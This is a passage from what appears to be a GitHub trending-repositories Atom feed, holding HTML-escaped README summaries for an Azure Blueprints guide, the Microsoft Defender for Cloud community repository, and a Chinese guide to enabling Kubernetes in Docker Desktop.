&#34;1.0.0.0&#34;,&#xA;    &#34;parameters&#34;: {&#xA;        &#34;myTemplateParameter&#34;: {&#xA;            &#34;type&#34;:&#34;string&#34;&#xA;        }&#xA;    },&#xA;},&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This shouldn&#39;t require any modification of your arm templates.&lt;/p&gt; &#xA;&lt;p&gt;You can also use the &lt;code&gt;New-AzBlueprintArtifact&lt;/code&gt; cmdlet to convert a standard ARM template into a blueprint artifact:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;New-AzBlueprintArtifact -Type TemplateArtifact -Name storage-account -Blueprint $bp -TemplateFile C:\StorageAccountArmTemplate.json -ResourceGroup &#34;storageRG&#34; -TemplateParameterFile &#34;C:\StorageAccountParams.json&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;How blueprint parameters display during assignment in the Azure Portal&lt;/h4&gt; &#xA;&lt;p&gt;When you assign a blueprint in the Azure Portal, the parameters will be diplayed according to how they are referenced. If a parameter is used by multiple artifacts, it will be displayed as a blueprint parameter. Like this:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/z_misc-files/images/bp-params.PNG&#34; alt=&#34;Image of blueprint parameters&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;If it is used by a single artifact, it will be displayed only in the context of that artifact, like so:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Azure/azure-blueprints/master/z_misc-files/images/artifact-params.PNG&#34; alt=&#34;Image of artifact parameters&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Passing values between artifacts&lt;/h3&gt; &#xA;&lt;p&gt;There are many reasons you may want or need to pass the output from one artifact as the input to another artifact that is deployed later in the blueprint assignment sequence. If so, you can make use of the &lt;code&gt;artifacts()&lt;/code&gt; function which lets you reference the details of a particular artifact.&lt;/p&gt; &#xA;&lt;p&gt;Start by passing an &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/azure-resource-manager/resource-group-authoring-templates#outputs&#34;&gt;output&lt;/a&gt; in your template like this example where we are using the &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/azure-resource-manager/resource-group-template-functions-resource#reference&#34;&gt;reference&lt;/a&gt; function:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;    ...&#xA;    &#34;outputs&#34;: {&#xA;        &#34;storageAccountId&#34;: {&#xA;            &#34;type&#34;: &#34;string&#34;,&#xA;            &#34;value&#34;: &#34;[reference(variables(&#39;storageAccountName&#39;), &#39;2016-01-01&#39;, &#39;Full&#39;).resourceId]&#34;&#xA;        }&#xA;    }&#xA;    ...&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then in another artifact, pass the artifact output into the next template as a parameter:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;    &#34;kind&#34;: &#34;template&#34;,&#xA;    &#34;name&#34;: &#34;vm-using-storage&#34;,&#xA;    &#34;properties&#34;: {&#xA;        &#34;template&#34;: {&#xA;            ...&#xA;        },&#xA;        &#34;parameters&#34;: {&#xA;            &#34;blueprintStorageId&#34;: {&#xA;                &#34;value&#34;: &#34;[artifacts(&#39;storage&#39;).outputs.storageAccountId]&#34;&#xA;            }&#xA;        }&#xA;    },&#xA;    &#34;type&#34;: &#34;Microsoft.Blueprint/blueprints/artifacts&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Once you&#39;ve done that, you can use that parameter anywhere in the &lt;code&gt;template&lt;/code&gt; section of the artifact.&lt;/p&gt; &#xA;&lt;h3&gt;Sequencing the deployment of artifacts&lt;/h3&gt; &#xA;&lt;p&gt;Often, you will want to run your templates in a specific order. For example, you may want to create a vnet before you create a vm. In that case, you can use the &lt;code&gt;dependsOn&lt;/code&gt; property to take a dependency on another artifact.&lt;/p&gt; &#xA;&lt;p&gt;In this example, this template artifact &lt;code&gt;dependsOn&lt;/code&gt; the &lt;code&gt;policyAssignment&lt;/code&gt; artifact, so the policy will get assigned first:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;    &#34;kind&#34;: &#34;template&#34;,&#xA;    &#34;properties&#34;: {&#xA;      ...&#xA;      &#34;dependsOn&#34;: [&#34;policyAssignment&#34;],&#xA;      ...&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Push the Blueprint definition to Azure&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-AzBlueprintWithArtifact -Name Boilerplate -ManagementGroupId &#34;DevMG&#34; -InputPath  &#34;.\samples\101-boilerplate&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now you should see a new blueprint definition in Azure. You can update the blueprint by simply re-running the above command.&lt;/p&gt; &#xA;&lt;p&gt;That’s it!&lt;/p&gt; &#xA;&lt;p&gt;You might run into some issues. Here are some common ones:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Missing a required property&lt;/strong&gt; – this will result in a 400 bad request. This could be a lot of things. Make sure your blueprint and artifacts have all required properties.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;code&gt;parameters&lt;/code&gt; in an artifact are not found in the main blueprint file.&lt;/strong&gt; Make sure all parameter references are complete. If you are using a parameter in an artifact, make sure it is defined in the main &lt;code&gt;blueprint.json&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;code&gt;policyDefinitionId&lt;/code&gt; or &lt;code&gt;roleDefinitionId&lt;/code&gt; does not exist.&lt;/strong&gt; If you are referencing a custom policy or custom role, make sure that the policy or role exists at or above the management group where the blueprint is saved.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Next steps&lt;/h2&gt; &#xA;&lt;p&gt;From here you will need to &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/governance/blueprints/create-blueprint-portal#publish-a-blueprint&#34;&gt;publish the blueprint&lt;/a&gt; and then &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/governance/blueprints/create-blueprint-portal#assign-a-blueprint&#34;&gt;assign the blueprint&lt;/a&gt; which you can do with either the azure portal or the rest API.&lt;/p&gt; &#xA;&lt;p&gt;Let us know in the comments if you have any issues!&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.microsoft.com&#34;&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Azure/Microsoft-Defender-for-Cloud</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/Azure/Microsoft-Defender-for-Cloud</id>
    <link href="https://github.com/Azure/Microsoft-Defender-for-Cloud" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Welcome to the Microsoft Defender for Cloud community repository&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft Defender for Cloud&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://img.shields.io/github/license/azure/Microsoft-Defender-for-Cloud?label=License&amp;amp;style=plastic&#34; alt=&#34;GitHub&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/contributors/azure/Microsoft-Defender-for-Cloud?label=Contributors&amp;amp;style=plastic&#34; alt=&#34;GitHub contributors&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/last-commit/azure/Microsoft-Defender-for-Cloud/main?label=Last%20commit&amp;amp;style=plastic&#34; alt=&#34;GitHub last commit (branch)&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/commit-activity/m/azure/Microsoft-Defender-for-Cloud?label=Commit%20activity&amp;amp;style=plastic&#34; alt=&#34;GitHub commit activity&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/issues/azure/Microsoft-Defender-for-Cloud?label=Issues&amp;amp;style=plastic&#34; alt=&#34;GitHub issues&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Welcome to the Microsoft Defender for Cloud (formerly known as Azure Security Center) community repository. This repository contains:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Security recommendations that are in private preview&lt;/li&gt; &#xA; &lt;li&gt;Programmatic remediation tools for security recommendations&lt;/li&gt; &#xA; &lt;li&gt;PowerShell scripts for programmatic management&lt;/li&gt; &#xA; &lt;li&gt;Azure Policy custom definitions for at-scale management of Microsoft Defender for Cloud&lt;/li&gt; &#xA; &lt;li&gt;Logic App templates that work with Defender for Cloud&#39;s Logic App connectors (to automate response to Security alerts and recommendations)&lt;/li&gt; &#xA; &lt;li&gt;Logic App templates that help you run regular tasks or reports within the scope of Microsoft Defender for Cloud&lt;/li&gt; &#xA; &lt;li&gt;Custom workbooks to visualize Defender for Cloud data&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;All of the above will help you work programmatically at scale with Microsoft Defender for Cloud and provide you additional value to secure your environment, some of which has not yet been embedded into the product (yet). You can submit any questions or requests &lt;a href=&#34;https://github.com/Azure/Microsoft-Defender-for-Cloud/issues&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;What&#39;s new?&lt;/h2&gt; &#xA;&lt;p&gt;Please find the latest and greatest automations on our &lt;a href=&#34;https://github.com/Azure/Microsoft-Defender-for-Cloud/wiki/What&#39;s-New&#34;&gt;What&#39;s New Page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;p&gt;All automations within this repository are provided as is, without SLA or official support. However, if you have an issue please fill out a &lt;a href=&#34;https://github.com/Azure/Microsoft-Defender-for-Cloud/issues/new?assignees=&amp;amp;labels=&amp;amp;template=bug_report.md&amp;amp;title=&#34;&gt;bug report&lt;/a&gt; and reference the automation artifact, so the community can try to solve it.&lt;/p&gt; &#xA;&lt;h2&gt;Wiki&lt;/h2&gt; &#xA;&lt;p&gt;This project has its own &lt;a href=&#34;https://github.com/Azure/Microsoft-Defender-for-Cloud/wiki&#34;&gt;Wiki&lt;/a&gt; which will provide you with further information about the Microsoft Defender for Cloud community, how to contribute, templates to use, and further resources.&lt;/p&gt; &#xA;&lt;h2&gt;Additional resources&lt;/h2&gt; &#xA;&lt;p&gt;Please visit the following additional resources to learn more about Microsoft Defender for Cloud and participate in discussions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/bd-p/MicrosoftDefenderCloud&#34;&gt;Microsoft Defender for Cloud Forum&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/bg-p/MicrosoftDefenderCloudBlog&#34;&gt;Microsoft Defender for Cloud Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://feedback.azure.com/d365community/forum/0f853254-0425-ec11-b6e6-000d3a4f07b8&#34;&gt;Microsoft Defender for Cloud Feature suggestion&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/azure/security-center/defender-for-cloud-introduction&#34;&gt;Microsoft Defender for Cloud documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/securitycenter/&#34;&gt;Microsoft Defender for Cloud API documentation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.microsoft.com&#34;&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Anyone can contribute to this repo, you don&#39;t need to be a pro. You have an interesting Logic App, Policy, or other automation artifact? Then fork this repo, add your content to your fork and submit a pull request.&lt;/p&gt; &#xA;&lt;p&gt;To make sure your contribution aligns with our &lt;a href=&#34;https://raw.githubusercontent.com/Azure/Microsoft-Defender-for-Cloud/main/Contributing.md&#34;&gt;Contribution Guideline&lt;/a&gt;, please make sure to review it before submitting.&lt;/p&gt; &#xA;&lt;h3&gt;Pull Request&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;After you push your changes, you will need to submit the &lt;a href=&#34;https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/about-pull-requests&#34;&gt;Pull Request (PR)&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;After submission, check the &lt;a href=&#34;https://github.com/Azure/Microsoft-Defender-for-Cloud/pulls&#34;&gt;Pull Request&lt;/a&gt; for comments.&lt;/li&gt; &#xA; &lt;li&gt;Make changes as suggested and update your branch or explain why no change is needed. Resolve the comment when done.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>AliyunContainerService/k8s-for-docker-desktop</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/AliyunContainerService/k8s-for-docker-desktop</id>
    <link href="https://github.com/AliyunContainerService/k8s-for-docker-desktop" rel="alternate"></link>
    <summary type="html">&lt;p&gt;为Docker Desktop for Mac/Windows开启Kubernetes和Istio。&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Docker Desktop for Mac/Windows 开启 Kubernetes&lt;/h1&gt; &#xA;&lt;p&gt;中文 | &lt;a href=&#34;https://raw.githubusercontent.com/AliyunContainerService/k8s-for-docker-desktop/master/README_en.md&#34;&gt;English&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;说明:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;需安装 Docker Desktop 的 Mac 或者 Windows 版本，如果没有请下载&lt;a href=&#34;https://store.docker.com/search?type=edition&amp;amp;offering=community&#34;&gt;下载 Docker CE最新版本&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;当前 master 分支已经在 Docker for Mac/Windows 4.8.0 (包含 Docker CE 20.10.14 和 Kubernetes 1.24.0) 版本测试通过&lt;/li&gt; &#xA; &lt;li&gt;如果需要测试其他版本，请查看 Docker Desktop版本，Docker -&amp;gt; About Docker Desktop &lt;img src=&#34;https://raw.githubusercontent.com/AliyunContainerService/k8s-for-docker-desktop/master/images/about.png&#34; alt=&#34;about&#34;&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.24.0, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.24.0&#34;&gt;v1.24.0 分支&lt;/a&gt; &lt;code&gt;git checkout v1.24.0&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.23.4, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.23.4&#34;&gt;v1.23.4 分支&lt;/a&gt; &lt;code&gt;git checkout v1.23.4&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.22.5, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.22.5&#34;&gt;v1.22.5 分支&lt;/a&gt; &lt;code&gt;git checkout v1.22.5&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.22.4, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.22.4&#34;&gt;v1.22.4 分支&lt;/a&gt; &lt;code&gt;git checkout v1.22.4&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.21.5, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.21.5&#34;&gt;v1.21.5 分支&lt;/a&gt; &lt;code&gt;git checkout v1.21.5&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.21.4, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.21.4&#34;&gt;v1.21.4 分支&lt;/a&gt; &lt;code&gt;git checkout v1.21.4&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.21.3, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.21.3&#34;&gt;v1.21.3 分支&lt;/a&gt; &lt;code&gt;git checkout v1.21.3&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.21.2, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.21.2&#34;&gt;v1.21.2 分支&lt;/a&gt; &lt;code&gt;git checkout v1.21.2&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.21.1, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.21.1&#34;&gt;v1.21.1 分支&lt;/a&gt; &lt;code&gt;git checkout v1.21.1&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.19.3, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.19.3&#34;&gt;v1.19.3 分支&lt;/a&gt; &lt;code&gt;git checkout v1.19.3&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.19.2, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.19.2&#34;&gt;v1.19.2 分支&lt;/a&gt; &lt;code&gt;git checkout v1.19.2&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.18.8, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.18.8&#34;&gt;v1.18.8 分支&lt;/a&gt; &lt;code&gt;git checkout v1.18.8&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.18.6, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.18.6&#34;&gt;v1.18.6 分支&lt;/a&gt; &lt;code&gt;git checkout v1.18.6&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.18.3, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.18.3&#34;&gt;v1.18.3 分支&lt;/a&gt; &lt;code&gt;git checkout v1.18.3&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.16.5, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.16.5&#34;&gt;v1.16.5 分支&lt;/a&gt; &lt;code&gt;git checkout v1.16.5&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.15.5, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.15.5&#34;&gt;v1.15.5 分支&lt;/a&gt; &lt;code&gt;git checkout v1.15.5&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.15.4, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.15.4&#34;&gt;v1.15.4 分支&lt;/a&gt; &lt;code&gt;git checkout v1.15.4&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.14.8, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.14.8&#34;&gt;v1.14.8 分支&lt;/a&gt; &lt;code&gt;git checkout v1.14.8&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.14.7, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.14.7&#34;&gt;v1.14.7 分支&lt;/a&gt; &lt;code&gt;git checkout v1.14.7&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.14.6, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.14.6&#34;&gt;v1.14.6 分支&lt;/a&gt; &lt;code&gt;git checkout v1.14.6&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.14.3, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.14.3&#34;&gt;v1.14.3 分支&lt;/a&gt; &lt;code&gt;git checkout v1.14.3&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.14.1, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.14.1&#34;&gt;v1.14.1 分支&lt;/a&gt; &lt;code&gt;git checkout v1.14.1&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.13.0, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.13.0&#34;&gt;v1.13.0 分支&lt;/a&gt; &lt;code&gt;git checkout v1.13.0&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;如Kubernetes版本为 v1.10.11, 请使用下面命令切换 &lt;a href=&#34;https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.10.11&#34;&gt;v1.10.11 分支&lt;/a&gt; &lt;code&gt;git checkout v1.10.11&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;注：如果发现K8s版本与您的环境不一致，可以修改&lt;code&gt;images.properties&lt;/code&gt;文件指明所需镜像版本，欢迎Pull Request。&lt;/p&gt; &#xA;&lt;h3&gt;开启 Kubernetes&lt;/h3&gt; &#xA;&lt;p&gt;为 Docker daemon 配置镜像加速，参考&lt;a href=&#34;https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors&#34;&gt;阿里云镜像服务&lt;/a&gt; 或中科大镜像加速地址&lt;code&gt;https://docker.mirrors.ustc.edu.cn&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AliyunContainerService/k8s-for-docker-desktop/master/images/mirror.png&#34; alt=&#34;mirror&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;可选操作: 为 Kubernetes 配置 CPU 和 内存资源，建议分配 4GB 或更多内存。&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AliyunContainerService/k8s-for-docker-desktop/master/images/resource.png&#34; alt=&#34;resource&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;从阿里云镜像服务下载 Kubernetes 所需要的镜像&lt;/p&gt; &#xA;&lt;p&gt;在 Mac 上执行如下脚本&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./load_images.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在Windows上，使用 PowerShell&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt; .\load_images.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;说明:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;如果因为安全策略无法执行 PowerShell 脚本，请在 “以管理员身份运行” 的 PowerShell 中执行 &lt;code&gt;Set-ExecutionPolicy RemoteSigned&lt;/code&gt; 命令。&lt;/li&gt; &#xA; &lt;li&gt;如果需要，可以通过修改 &lt;code&gt;images.properties&lt;/code&gt; 文件自行加载你自己需要的镜像&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;开启 Kubernetes，并等待 Kubernetes 开始运行 &lt;img src=&#34;https://raw.githubusercontent.com/AliyunContainerService/k8s-for-docker-desktop/master/images/k8s.png&#34; alt=&#34;k8s&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;TIPS&lt;/strong&gt;：&lt;/p&gt; &#xA;&lt;p&gt;在Mac上:&lt;/p&gt; &#xA;&lt;p&gt;如果在Kubernetes部署的过程中出现问题，可以通过docker desktop应用日志获得实时日志信息：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pred=&#39;process matches &#34;.*(ocker|vpnkit).*&#34;&#xA;  || (process in {&#34;taskgated-helper&#34;, &#34;launchservicesd&#34;, &#34;kernel&#34;} &amp;amp;&amp;amp; eventMessage contains[c] &#34;docker&#34;)&#39;&#xA;/usr/bin/log stream --style syslog --level=debug --color=always --predicate &#34;$pred&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在Windows上:&lt;/p&gt; &#xA;&lt;p&gt;如果在Kubernetes部署的过程中出现问题，可以在 C:\ProgramData\DockerDesktop下的service.txt 查看Docker日志, 在 C:\Users\yourUserName\AppData\Local\Docker下的log.txt 查看Kubernetes日志&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;问题诊断&lt;/strong&gt;：&lt;/p&gt; &#xA;&lt;p&gt;如果看到 Kubernetes一直在启动状态，请参考&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/docker/for-win/issues/3769#issuecomment-486046718&#34;&gt;Issue 3769(comment)&lt;/a&gt; 或 &lt;a href=&#34;https://github.com/docker/for-mac/issues/3649#issuecomment-497441158&#34;&gt;Issue 3649(comment)&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;在macOS上面，执行 &lt;code&gt;rm -fr &#39;~/Library/Group\ Containers/group.com.docker/pki&#39;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;在Windows上面删除 &#39;C:\ProgramData\DockerDesktop\pki&#39; 目录 和 &#39;C:\Users\yourUserName\AppData\Local\Docker\pki&#39; 目录&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/docker/for-win/issues/1962#issuecomment-431091114&#34;&gt;Issue 1962(comment)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;配置 Kubernetes&lt;/h3&gt; &#xA;&lt;p&gt;可选操作: 切换Kubernetes运行上下文至 docker-desktop (之前版本的 context 为 docker-for-desktop)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl config use-context docker-desktop&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;验证 Kubernetes 集群状态&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl cluster-info&#xA;kubectl get nodes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;配置 Kubernetes 控制台&lt;/h3&gt; &#xA;&lt;h4&gt;部署 Kubernetes dashboard&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.5.1/aio/deploy/recommended.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;或&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;kubectl apply -f 